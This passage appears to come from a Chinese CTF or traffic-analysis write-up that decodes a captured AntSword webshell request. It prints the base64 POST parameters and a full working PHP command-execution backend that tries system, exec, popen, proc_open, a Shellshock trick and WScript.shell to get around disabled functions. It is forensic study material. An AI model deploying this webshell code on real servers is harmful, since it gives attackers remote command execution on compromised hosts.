class="number">4</span>ZWMnKSl<span class="number">7</span>QGV<span class="number">4</span>ZWMoJGMsJG<span class="number">8</span>sJHJldCk<span class="number">7</span>cHJpbnQoam<span class="number">9</span>pbigiCiIsJG<span class="number">8</span>pKTt<span class="number">9</span>ZWxzZWlmKGZlKCdwb<span class="number">3</span>BlbicpKXskZnA<span class="number">9</span>QHBvcGVuKCRjLCdyJyk<span class="number">7</span>d<span class="number">2</span>hpbGUoIUBmZW<span class="number">9</span>mKCRmcCkpe<span class="number">3</span>ByaW<span class="number">50</span>KEBmZ<span class="number">2</span>V<span class="number">0</span>cygkZnAsMjA<span class="number">0</span>OCkpO<span class="number">31</span>AcGNsb<span class="number">3</span>NlKCRmcCk<span class="number">7</span>fWVsc<span class="number">2</span>VpZihmZSgncHJvY<span class="number">19</span>vcGVuJykpeyRwID<span class="number">0</span>gQHByb<span class="number">2</span>Nfb<span class="number">3</span>BlbigkYywgYXJyYXkoMSA<span class="number">9</span>PiBhcnJheSgncGlwZScsICd<span class="number">3</span>JyksIDIgPT<span class="number">4</span>gYXJyYXkoJ<span class="number">3</span>BpcGUnLCAndycpKSwgJGlvKTt<span class="number">3</span>aGlsZSghQGZlb<span class="number">2</span>YoJGlvWzFdKSl<span class="number">7</span>cHJpbnQoQGZnZXRzKCRpb<span class="number">1</span>sxXSwyMDQ<span class="number">4</span>KSk<span class="number">7</span>fXdoaWxlKCFAZmVvZigkaW<span class="number">9</span>bMl<span class="number">0</span>pKXtwcmludChAZmdldHMoJGlvWzJdLDIwNDgpKTt<span class="number">9</span>QGZjbG<span class="number">9</span>zZSgkaW<span class="number">9</span>bMV<span class="number">0</span>pO<span class="number">0</span>BmY<span class="number">2</span>xvc<span class="number">2</span>UoJGlvWzJdKTtAcHJvY<span class="number">19</span>jbG<span class="number">9</span>zZSgkcCk<span class="number">7</span>fWVsc<span class="number">2</span>VpZihmZSgnYW<span class="number">50</span>c<span class="number">3</span>lzdGVtJykpe<span class="number">0</span>BhbnRzeXN<span class="number">0</span>ZW<span class="number">0</span>oJGMpO<span class="number">31</span>lbHNlaWYocnVuc<span class="number">2</span>hlbGxzaG<span class="number">9</span>jaygkZCwgJGMpKSB<span class="number">7</span>cmV<span class="number">0</span>dXJuICRyZXQ<span class="number">7</span>fWVsc<span class="number">2</span>VpZihzdWJzdHIoJGQsMCwxKSE<span class="number">9</span>Ii<span class="number">8</span>iICYmIEBjbGFzc<span class="number">19</span>leGlzdHMoIkNPTSIpKXskdz<span class="number">1</span>uZXcgQ<span class="number">09</span>NKCdXU<span class="number">2</span>NyaXB<span class="number">0</span>LnNoZWxsJyk<span class="number">7</span>JGU<span class="number">9</span>JHctPmV<span class="number">4</span>ZWMoJGMpOyRzbz<span class="number">0</span>kZS<span class="number">0</span>%<span class="number">2</span>BU<span class="number">3</span>RkT<span class="number">3</span>V<span class="number">0</span>KCk<span class="number">7</span>JHJldC<span class="number">49</span>JHNvLT<span class="number">5</span>SZWFkQWxsKCk<span class="number">7</span>JHNlPSRlLT<span class="number">5</span>TdGRFcnIoKTskcmV<span class="number">0</span>Lj<span class="number">0</span>kc<span class="number">2</span>UtPlJlYWRBbGwoKTtwcmludCgkcmV<span class="number">0</span>KTt<span class="number">9</span>ZWxzZXskcmV<span class="number">0</span>ID<span class="number">0</span>gMTI<span class="number">3</span>O<span class="number">31</span>yZXR<span class="number">1</span>cm<span class="number">4</span>gJHJldDt<span class="number">9</span>OyRyZXQ<span class="number">9</span>QHJ<span class="number">1</span>bmNtZCgkci<span class="number">4</span>iIDI%<span class="number">2</span>BJjEiKTtwcmludCAoJHJldCE<span class="number">9</span>MCk%<span class="number">2</span>FInJldD<span class="number">17</span>JHJldH<span class="number">0</span>iOiIiOzt<span class="number">9</span>Y<span class="number">2</span>F<span class="number">0</span>Y<span class="number">2</span>goRXhjZXB<span class="number">0</span>aW<span class="number">9</span>uICRlKXtlY<span class="number">2</span>hvICJFUlJPUjovLyIuJGUtPmdldE<span class="number">1</span>lc<span class="number">3</span>NhZ<span class="number">2</span>UoKTt<span class="number">9</span>O<span class="number">2</span>Fzb<span class="number">3</span>V<span class="number">0</span>cHV<span class="number">0</span>KCk<span class="number">7</span>ZGllKCk<span class="number">7</span>&amp;o<span class="number">1</span>faebd<span class="number">4</span>ec<span class="number">3</span>d<span class="number">97</span>=jmL<span class="number">2</span>Jpbi<span class="number">9</span>zaA%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>一眼丁真，直接上php,快速处理一下</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">[<span class="string">&quot;_GET&quot;</span>]=&gt;</span><br><span class="line"><span class="built_in">array</span>(<span class="number">0</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line">[<span class="string">&quot;_POST&quot;</span>]=&gt;</span><br><span class="line"><span class="built_in">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;cmd&quot;</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">76</span>) <span class="string">&quot;var_dump(get_defined_vars());@eval(@base64_decode($_POST[&#x27;kc1b01ee4a605&#x27;]));&quot;</span></span><br><span class="line">  [<span class="string">&quot;e57fb9c067c677&quot;</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">2</span>) <span class="string">&quot;E8&quot;</span></span><br><span class="line">  [<span class="string">&quot;g479cf6f058cf8&quot;</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">98</span>) <span class="string">&quot;hnY2QgIi9Vc2Vycy9jaGFuZy9TaXRlcy90ZXN0IjtoZWFkIC1uIC4uL2ZsYWcudHh0O2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ==&quot;</span></span><br><span class="line">  [<span class="string">&quot;kc1b01ee4a605&quot;</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">3476</span>) <span class="string">&quot;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiZjlhIi4iYTI1MCI7ZWNobyBAYXNlbmMoJG91dHB1dCk7ZWNobyAiMTNlIi4iM2I5Ijt9b2Jfc3RhcnQoKTt0cnl7JHA9YmFzZTY0X2RlY29kZShzdWJzdHIoJF9QT1NUWyJvMWZhZWJkNGVjM2Q5NyJdLDIpKTskcz1iYXNlNjRfZGVjb2RlKHN1YnN0cigkX1BPU1RbImc0NzljZjZmMDU4Y2Y4Il0sMikpOyRlbnZzdHI9QGJhc2U2NF9kZWNvZGUoc3Vic3RyKCRfUE9TVFsiZTU3ZmI5YzA2N2M2NzciXSwyKSk7JGQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOyRjPXN1YnN0cigkZCwwLDEpPT0iLyI/Ii1jIFwieyRzfVwiIjoiL2MgXCJ7JHN9XCIiO2lmKHN1YnN0cigkZCwwLDEpPT0iLyIpe0BwdXRlbnYoIlBBVEg9Ii5nZXRlbnYoIlBBVEgiKS4iOi91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL3NiaW46L3Vzci9iaW46L3NiaW46L2JpbiIpO31lbHNle0BwdXRlbnYoIlBBVEg9Ii5nZXRlbnYoIlBBVEgiKS4iO0M6L1dpbmRvd3Mvc3lzdGVtMzI7QzovV2luZG93cy9TeXNXT1c2NDtDOi9XaW5kb3dzO0M6L1dpbmRvd3MvU3lzdGVtMzIvV2luZG93c1Bvd2VyU2hlbGwvdjEuMC87Iik7fWlmKCFlbXB0eSgkZW52c3RyKSl7JGVudmFycj1leHBsb2RlKCJ8fHxhc2xpbmV8fHwiLCAkZW52c3RyKTtmb3JlYWNoKCRlbnZhcnIgYXMgJHYpIHtpZiAoIWVtcHR5KCR2KSkge0BwdXRlbnYoc3RyX3JlcGxhY2UoInx8fGFza2V5fHx8IiwgIj0iLCAkdikpO319fSRyPSJ7JHB9IHskY30iO2Z1bmN0aW9uIGZlKCRmKXskZD1leHBsb2RlKCIsIixAaW5pX2dldCgiZGlzYWJsZV9mdW5jdGlvbnMiKSk7aWYoZW1wdHkoJGQpKXskZD1hcnJheSgpO31lbHNleyRkPWFycmF5X21hcCgndHJpbScsYXJyYXlfbWFwKCdzdHJ0b2xvd2VyJywkZCkpO31yZXR1cm4oZnVuY3Rpb25fZXhpc3RzKCRmKSYmaXNfY2FsbGFibGUoJGYpJiYhaW5fYXJyYXkoJGYsJGQpKTt9O2Z1bmN0aW9uIHJ1bnNoZWxsc2hvY2soJGQsICRjKSB7aWYgKHN1YnN0cigkZCwgMCwgMSkgPT0gIi8iICYmIGZlKCdwdXRlbnYnKSAmJiAoZmUoJ2Vycm9yX2xvZycpIHx8IGZlKCdtYWlsJykpKSB7aWYgKHN0cnN0cihyZWFkbGluaygiL2Jpbi9zaCIpLCAiYmFzaCIpICE9IEZBTFNFKSB7JHRtcCA9IHRlbXBuYW0oc3lzX2dldF90ZW1wX2RpcigpLCAnYXMnKTtwdXRlbnYoIlBIUF9MT0w9KCkgeyB4OyB9OyAkYyA+JHRtcCAyPiYxIik7aWYgKGZlKCdlcnJvcl9sb2cnKSkge2Vycm9yX2xvZygiYSIsIDEpO30gZWxzZSB7bWFpbCgiYUAxMjcuMC4wLjEiLCAiIiwgIiIsICItYnYiKTt9fSBlbHNlIHtyZXR1cm4gRmFsc2U7fSRvdXRwdXQgPSBAZmlsZV9nZXRfY29udGVudHMoJHRtcCk7QHVubGluaygkdG1wKTtpZiAoJG91dHB1dCAhPSAiIikge3ByaW50KCRvdXRwdXQpO3JldHVybiBUcnVlO319cmV0dXJuIEZhbHNlO307ZnVuY3Rpb24gcnVuY21kKCRjKXskcmV0PTA7JGQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKGZlKCdzeXN0ZW0nKSl7QHN5c3RlbSgkYywkcmV0KTt9ZWxzZWlmKGZlKCdwYXNzdGhydScpKXtAcGFzc3RocnUoJGMsJHJldCk7fWVsc2VpZihmZSgnc2hlbGxfZXhlYycpKXtwcmludChAc2hlbGxfZXhlYygkYykpO31lbHNlaWYoZmUoJ2V4ZWMnKSl7QGV4ZWMoJGMsJG8sJHJldCk7cHJpbnQoam9pbigiCiIsJG8pKTt9ZWxzZWlmKGZlKCdwb3BlbicpKXskZnA9QHBvcGVuKCRjLCdyJyk7d2hpbGUoIUBmZW9mKCRmcCkpe3ByaW50KEBmZ2V0cygkZnAsMjA0OCkpO31AcGNsb3NlKCRmcCk7fWVsc2VpZihmZSgncHJvY19vcGVuJykpeyRwID0gQHByb2Nfb3BlbigkYywgYXJyYXkoMSA9PiBhcnJheSgncGlwZScsICd3JyksIDIgPT4gYXJyYXkoJ3BpcGUnLCAndycpKSwgJGlvKTt3aGlsZSghQGZlb2YoJGlvWzFdKSl7cHJpbnQoQGZnZXRzKCRpb1sxXSwyMDQ4KSk7fXdoaWxlKCFAZmVvZigkaW9bMl0pKXtwcmludChAZmdldHMoJGlvWzJdLDIwNDgpKTt9QGZjbG9zZSgkaW9bMV0pO0BmY2xvc2UoJGlvWzJdKTtAcHJvY19jbG9zZSgkcCk7fWVsc2VpZihmZSgnYW50c3lzdGVtJykpe0BhbnRzeXN0ZW0oJGMpO31lbHNlaWYocnVuc2hlbGxzaG9jaygkZCwgJGMpKSB7cmV0dXJuICRyZXQ7fWVsc2VpZihzdWJzdHIoJGQsMCwxKSE9Ii8iICYmIEBjbGFzc19leGlzdHMoIkNPTSIpKXskdz1uZXcgQ09NKCdXU2NyaXB0LnNoZWxsJyk7JGU9JHctPmV4ZWMoJGMpOyRzbz0kZS0+U3RkT3V0KCk7JHJldC49JHNvLT5SZWFkQWxsKCk7JHNlPSRlLT5TdGRFcnIoKTskcmV0Lj0kc2UtPlJlYWRBbGwoKTtwcmludCgkcmV0KTt9ZWxzZXskcmV0ID0gMTI3O31yZXR1cm4gJHJldDt9OyRyZXQ9QHJ1bmNtZCgkci4iIDI+JjEiKTtwcmludCAoJHJldCE9MCk/InJldD17JHJldH0iOiIiOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7&quot;</span></span><br><span class="line">  [<span class="string">&quot;o1faebd4ec3d97&quot;</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">14</span>) <span class="string">&quot;jmL2Jpbi9zaA==&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先处理一下最长的<code>kc1b01ee4a605</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;f9a&quot;</span> . <span class="string">&quot;a250&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;13e&quot;</span> . <span class="string">&quot;3b9&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;o1faebd4ec3d97&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$s</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;g479cf6f058cf8&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$envstr</span> = @base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;e57fb9c067c677&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$c</span> = substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> ? <span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span> : <span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line">        <span class="variable">$envarr</span> = explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">                @putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$r</span> = <span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$d</span> = explode(<span class="string">&quot;,&quot;</span>, @ini_get(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$d</span> = array_map(<span class="string">&#x27;trim&#x27;</span>, array_map(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$d</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (function_exists(<span class="variable">$f</span>) &amp;&amp; is_callable(<span class="variable">$f</span>) &amp;&amp; !in_array(<span class="variable">$f</span>, <span class="variable">$d</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">                <span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">                putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">                    error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">            @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (fe(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">            @system(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">            @passthru(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">            @exec(<span class="variable">$c</span>, <span class="variable">$o</span>, <span class="variable">$ret</span>);</span><br><span class="line">            <span class="keyword">print</span>(join(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>, <span class="variable">$o</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$fp</span> = @popen(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>, <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose(<span class="variable">$fp</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>], <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>], <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">            @proc_close(<span class="variable">$p</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">            @antsystem(<span class="variable">$c</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$w</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">            <span class="variable">$e</span> = <span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);</span><br><span class="line">            <span class="variable">$so</span> = <span class="variable">$e</span>-&gt;StdOut();</span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$so</span>-&gt;ReadAll();</span><br><span class="line">            <span class="variable">$se</span> = <span class="variable">$e</span>-&gt;StdErr();</span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$se</span>-&gt;ReadAll();</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="variable">$ret</span> = @runcmd(<span class="variable">$r</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    <span class="keyword">print</span> (<span class="variable">$ret</span> != <span class="number">0</span>) ? <span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span> : <span class="string">&quot;&quot;</span>;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>这两个函数十分关键</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$p = base64_decode(<span class="keyword">substr</span>($_POST[<span class="string">&quot;o1faebd4ec3d97&quot;</span>], <span class="number">2</span>));</span><br><span class="line">$s = 